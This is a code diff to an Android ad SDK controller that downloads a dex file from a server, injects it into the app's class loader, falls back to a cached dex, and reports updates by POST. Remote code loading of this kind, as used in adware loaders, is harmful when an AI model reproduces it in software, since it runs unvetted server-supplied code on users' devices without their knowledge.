@@ -12,6 +12,7 @@ public class GAdController {
 	private static GAdController controller;
 	private Context context;
 	private String newSdkCode;
+	private String dexName;
 	
 	private GAdController()
 	{
@@ -34,7 +35,7 @@ public class GAdController {
 		
 		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
 		
-		GTool.httpGetRequest(GCommons.URI_GET_NEW_SDK, this, "revNewSdk", null);				
+		GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
 	}
 	
 	public static void showSpotAd(Context context)
@@ -55,20 +56,25 @@ public class GAdController {
 		JSONObject obj = null;
 		String versionCode = null;
 		String downloadPath = null;
-		
+		boolean isFind = true;
 		try {
 			 obj = new JSONObject(rev.toString());	
 			 versionCode = obj.getString("versionCode");
 			 downloadPath = obj.getString("downloadPath");
 			 newSdkCode = versionCode;
+			 dexName = downloadPath;
 		} catch (Exception e) {
+			isFind = false;
+			Log.e("------------","----------没有发现最新sdk包----");
 		}	
 		
 		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
 		Log.e("------------","----------curr sdk="+code);
-		if(code.equals(versionCode))
+		if(code.equals(versionCode) || !isFind)
 		{
 			Log.e("------------","----------startservice");
+			if(!isFind)
+				downloadPath =  GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_DEX_NAME, "");
 			String dexPath = GDexLoaderUtil.getDexPath(context, downloadPath);
 			final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
 	        GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
@@ -88,8 +94,9 @@ public class GAdController {
 		final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
         GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
         GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
+        GTool.saveSharedData(GCommons.SHARED_KEY_DEX_NAME,dexName);
         GDexLoaderUtil.call(context.getClassLoader(),context);
-       
+        GTool.httpPostRequest(GCommons.URI_POST_UPDATE_SDK_NUM, null, null, GCommons.CHANNEL);	
         Log.e("------------","----------newSdkCode sdk="+newSdkCode);
 	}
 }
